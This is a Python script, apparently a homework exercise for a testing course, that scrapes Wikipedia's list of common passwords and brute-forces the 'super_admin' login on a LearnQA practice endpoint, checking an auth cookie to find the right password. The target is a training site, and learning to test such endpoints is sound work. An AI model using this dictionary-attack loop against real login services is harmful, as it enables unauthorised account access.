# библиотеку ставил через pip install beautifulsoup4
from bs4 import BeautifulSoup
import requests
import json
url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
target_caption_text = "Top 25 most common passwords by year according to SplashData"
target_table = None
tables = soup.find_all('table')
for table in tables:
    caption = table.find('caption')
    if caption and target_caption_text in caption.text:
        target_table = table
        break
all_passwords_list = []
for row in table.find_all('tr')[1:]:
    cells = row.find_all('td')[1:]
    for cell in cells:
        password = cell.text.strip()
        all_passwords_list.append(password)
pas = list(set(all_passwords_list))
for i in range(len(pas)):
    url2 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    params = {"login": "super_admin", "password": pas[i]}
    if pas[i] == "photoshop[a]":
        params = {"login":"super_admin", "password":"photoshop"}
    if pas[i] == "adobe123[a]":
        params = {"login": "super_admin", "password": "adobe123"}
    response = requests.request("POST", url2, data=params)
    auth = dict(response.cookies)
    key = "auth_cookie"
    if key in auth:
        url3 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
        params2 = {"auth_cookie":auth[key]}
        response = requests.request("GET", url3, cookies=params2)
        if response.text == "You are NOT authorized":
            pass
        else:
            print(response.text, "\nПравильный пароль:", pas[i])
            break
